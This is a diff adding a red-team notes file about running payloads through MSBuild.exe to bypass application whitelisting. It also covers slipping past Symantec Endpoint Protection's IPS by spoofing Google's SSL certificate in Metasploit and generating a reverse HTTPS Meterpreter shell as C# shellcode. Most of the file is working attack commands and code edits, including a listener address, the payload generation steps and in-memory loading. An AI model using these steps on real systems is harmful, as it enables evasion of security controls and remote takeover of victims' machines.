@@ -1,0 +1,64 @@
+Notes
+
+For Msbuild.exe Application Whitelisting bypass
+MsbuildInline.xml loads a base64 encoded .Net C# Exe and runs in-memory
+Use directions in shellcodelauncher.cs to compile an Exe if needed
+
+Change between the double quotes:
+string s = System.IO.File.ReadAllText(@"CHANGEME.TXT");
+To the location of the file you have uploaded to the target
+
+
+Make sure to get the same Archetecture of the binary that you base64 encoded
+Path to Msbuild
+x86
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe 
+x64
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
+
+
+if there are errors and the Main() function you are calling expects an argument comment the below two lines:
+
+object o = a.CreateInstance(method.Name);
+method.Invoke(o, null);
+
+AND uncomment the below two lines:
+
+//string[] args1 = new string[] { "BasicOSInfo" };
+//a.EntryPoint.Invoke(null, new object[] { args1 });
+
+Change BasicOSInfo to the argument expected, can also put in something like "test" to see if that helps
+
+########
+
+To attempt to bypass SEP IPS module
+use the impersonate_ssl module and HTTPS rev meterpreter shellcode
+
+use auxiliary/gather/impersonate_ssl
+set RHOST www.google.com
+run
+(Get Path to pem cert and replace path below)
+
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set handlersslcert /root/.msf4/loot/20181016161059_default_172.217.5.100_www.google.com_p_584883.pem
+set stagerverifysslcert true
+exploit -j -z
+
+use payload/windows/x64/meterpreter/reverse_https
+set handlersslcert /root/.msf4/loot/20181016161059_default_172.217.5.100_www.google.com_p_584883.pem
+set stagerverifysslcert true
+set LHOST 172.16.6.130
+set LPORT 443
+
+generate -t csharp -f payload_csharp
+gedit payload_csharp
+
+Copy the stage 1 shell code to the ShellCodeRunner.cs file in this directory and compiling and base64 encoding to work with msbuildInline.xml 
+Or
+run as Msbuild inline task by replacing shellcode in mbuild.xml
+
+##########
+Additional C# binaries were tested with include Gh0stpack from SpectorOps
+can be used with AssemblyRunner.exe, just need to encrypt or b64 encode as needed
+
